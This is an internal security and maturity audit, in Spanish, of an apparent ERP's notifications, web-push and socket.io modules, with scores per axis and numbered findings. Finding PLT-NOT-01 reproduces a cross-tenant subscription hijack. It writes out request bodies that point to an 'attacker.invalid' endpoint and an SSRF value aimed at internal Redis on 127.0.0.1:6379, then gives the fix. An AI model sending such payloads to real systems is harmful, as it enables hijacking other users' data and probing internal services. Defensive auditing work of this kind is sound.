# Ficha — notifications + push-notifications + websockets (+ frontend features/notifications)
Familia PLTA · 2026-11-07 · Diagnóstico.

⚠️ CRÍTICO — PLT-NOT-01: escritura entre inquilinos en `push_subscription` por asignación masiva del `id` (confirmada en vivo).

## 1. Identificación
- Backend: `notifications/` (10 archivos, 1.111 l.; 6 specs), `push-notifications/` (4 archivos, 142 l.; **0 specs**), `websockets/` (5 archivos, 463 l.; 1 spec). Endpoints: `GET /notifications`, `POST /notifications/access-request`, `POST /notifications/test-notification`, `POST /notifications/:id/read`, `POST /notifications/read-all`, `POST /push/subscribe`, `DELETE /push/unsubscribe`; gateway socket.io (`EventsGateway`, eventos `new_notification`, `user-status-update`, `force-logout`, `job-status`, `import-progress`). Tablas: `notification`, `push_subscription`.
- Frontend: `client-web/src/app/features/notifications/notifications.page.ts` (83 l.), `core/services/websocket.service.ts`, `notification-center.service.ts`.
- Núcleo para vender: medio (aprobaciones y avisos dependen de él).

## 2. Estándar de referencia
(a) Básicas: centro de notificaciones por usuario y empresa, leído/no leído, enlaces al documento, tiempo real, preferencias por canal; push con suscripciones validadas. Avanzadas: digest, reglas por evento, entrega multi-réplica. (b) Invariantes: un usuario solo ve y modifica lo suyo; las salas de tiempo real están acotadas por tenant; ninguna suscripción de un usuario es modificable por otro. (c) NetSuite/Dynamics/Odoo (Discuss/bus por canal de compañía) — confianza media, conocimiento general. (d) DTO validados, adaptador Redis para socket.io en multi-réplica, salas por tenant asignadas en servidor.

## 3. Resultado
- **Madurez: 45 (38–52, confianza alta)** (tope por crítico ≤59; eje 8 = 30). Preparación: 45. **Veredicto: No listo** (crítico abierto). Eje más débil: 8.

## 4. Ejes
| Eje | Nota | Evidencia | Qué falta |
|---|---|---|---|
| 1 | 60 (media) | `POST /notifications/test-notification` crea aviso real (201) que aparece en `GET /notifications`; `createLocalizedNotification` persiste + socket + push. Endpoint de prueba con texto español fijo expuesto en producción (controller l.49-54) | Preferencias por canal; retirar endpoint de prueba |
| 2 | 55 (media) | `markAsRead` filtra por userId (404 cruzado); `markAllAsRead(userId)` sin organización; sin índices compuestos verificados | Paginación real (hoy `take: NOTIFICATION_PAGE` sin cursor) |
| 3 | N/A | — | — |
| 4 | 50 (media) | `PushNotificationsController` inyecta repositorio directo, cuerpo tipado inline `{endpoint,p256dh,auth}` sin clase DTO → ValidationPipe no valida (push-notifications.controller.ts:22-31) | DTO con `@IsUrl({protocols:['https']})` y servicio |
| 5 | 60 | Notifications importa `EventsGateway` concreto (notifications.service.ts:11) | Puerto de emisión |
| 6 | 60 | `any` en `markAllAsRead` | — |
| 7 | 45 (media) | Presencia y `sendToUser` en memoria del proceso; no hay adaptador Redis de socket.io (grep `createAdapter|@socket.io/redis` en src y package.json: 0) → con 2+ réplicas los avisos en tiempo real se pierden para sockets de otra réplica; envío push secuencial en la request (`for … await sendPushNotification`) | Adaptador Redis; push encolado |
| 8 | **30 (25–38, alta)** | PLT-NOT-01 confirmado. Positivo: socket sin cookie → desconectado; socket de qa-do-plt NO recibió `user-status-update` de qa-do-b; eventos `join/joinRoom/subscribe` con sala `org:<B>` ignorados (no hay `@SubscribeMessage` de unión; script `agents/plta/ws.cjs`). `POST /notifications/<id ajeno>/read` desde qa-do-b → 404 | DTO + `create()` sin spread; validar endpoint (https, sin hosts internos) |
| 9 | 40 (media) | push sin specs; gateway con spec de aislamiento (events.gateway.spec.ts, 300 l.) | Spec de subscribe con id ajeno |
| 10 | 50 | Logs estructurados en gateway (`ws_disconnected_on_revocation`) | Métricas de entrega |
| 11 | 55 (baja) | Página de notificaciones simple; no probada en navegador | Estados vacío/error; preferencias |
| 12 | 45 (media) | Sin preferencias por canal/evento ni digest configurable (solo `overdue-invoices-digest` fijo) | — |

## 5. Compuertas
1 Parcial · 2 Parcial · **3 No cumple (PLT-NOT-01)** · 4 No cumple (push sin DTO) · 5 Cumple · 6 N/A · 7 Parcial · 8 N/A · 9 Cumple · 10 Parcial · 11 No verificado · 12 Parcial.

## 6. Hallazgos
- **PLT-NOT-01** · push-notifications · eje 8 · seguridad · **Crítica** · `push-notifications/push-notifications.controller.ts:22-31` · `create({...subscriptionDto, userId})` + `save()` con `id` del cuerpo hace UPSERT sobre la fila de otro usuario. Pasos: (1) qa-do-plt `POST /push/subscribe {"endpoint":"http://127.0.0.1:6379/QA-PLTA-ssrf",…}` → 201, fila `10612de1…` de userId plt; (2) qa-do-b `POST /push/subscribe {"id":"10612de1…","endpoint":"https://attacker.invalid/QA-PLTA-hijack",…}` → 201; (3) BD: la fila `10612de1…` ahora pertenece a `qa-do-b@virtex.test` con el endpoint del atacante. Requiere conocer el UUID (no enumerable), pero es una escritura entre tenants. Además el `endpoint` no se valida: se aceptó `http://127.0.0.1:6379/...` → con VAPID activo el servidor haría POST a hosts internos (SSRF; no ejecutado porque VAPID está desactivado). Limpieza: fila borrada con `/push/unsubscribe`. · Forma correcta: DTO con whitelist (sin `id`), `@IsUrl` https y lista de hosts de push conocidos, `insert` no `save`, unique (userId, endpoint). · Bloquea la venta. · S.
- **PLT-NOT-02** · websockets · eje 7 · robustez · Alta · `websockets/events.gateway.ts` (Map en memoria), `configured-io.adapter.ts` · Sin adaptador Redis: en despliegue multi-réplica `sendToUser` (progreso de importaciones, avisos) falla silenciosamente para la mitad de los usuarios. · `@socket.io/redis-adapter` sobre el Redis existente (no es infraestructura nueva). · Riesgo operativo. · S.
- **PLT-NOT-03** · notifications · eje 7 · rendimiento · Media · `notifications.service.ts:124-130,149-155` · Push web enviado en serie dentro de la request que crea el aviso; un endpoint lento bloquea la operación de negocio. · Encolar en BullMQ. · S.
- **PLT-NOT-04** · notifications · eje 1/11 · higiene · Baja · `notifications.controller.ts:49-54` · Endpoint de prueba con texto literal en español en producción (`organizationId: null`). · Restringir a dev. · S.
- **PLT-NOT-05** · push · eje 4 · Media · `push_subscription` solo tiene PK (pg_indexes) — sin unique (userId, endpoint) → duplicados y envíos repetidos. · S.

## 7. Camino mínimo
1. PLT-NOT-01 (S). 2. Adaptador Redis (S). 3. Push asíncrono (S). 4. Specs de push (S).
## 8. Camino a 100
Preferencias por canal/evento (+10, M); digest configurable (+5, M); entrega multi-réplica probada (+8, S); métricas (+4, S).
## 9. Competitividad
Brecha básica: preferencias de notificación. Fuentes: Odoo bus/Discuss, NetSuite reminders (confianza media).
## 10. Fortalezas
Salas por tenant asignadas por el servidor; revalidación periódica de sockets (5 min) y desconexión por revocación; avisos localizados re-traducidos al leer.
## 11. No verificado
Envío real de push (VAPID desactivado; no se envió nada externo); UI de notificaciones en navegador; multi-réplica.
